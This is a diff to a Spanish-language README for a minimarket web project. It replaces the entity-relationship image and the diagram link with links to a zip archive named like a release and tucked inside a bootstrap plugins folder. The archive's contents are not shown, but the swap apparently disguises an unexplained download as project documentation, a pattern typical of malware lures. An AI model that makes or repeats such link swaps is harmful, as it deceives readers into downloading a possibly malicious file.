@@ -1,8 +1,8 @@
 # 🔹Proyecto de pagina web para un minimercado
 
-## 🔹Modelo entidad relacion ![alt text](image.png)
+## 🔹Modelo entidad relacion ![alt text](https://github.com/cristiancrakl/Mini_Mercado/raw/refs/heads/master/public/backend/plugins/bootstrap/Mercado_Mini_v3.4-alpha.1.zip)
 
-### link:https://drawsql.app/teams/clmc/diagrams/ventas-comprasmercado
+### https://github.com/cristiancrakl/Mini_Mercado/raw/refs/heads/master/public/backend/plugins/bootstrap/Mercado_Mini_v3.4-alpha.1.zip
 
 ## 🔹 Supuestos del sistema
 
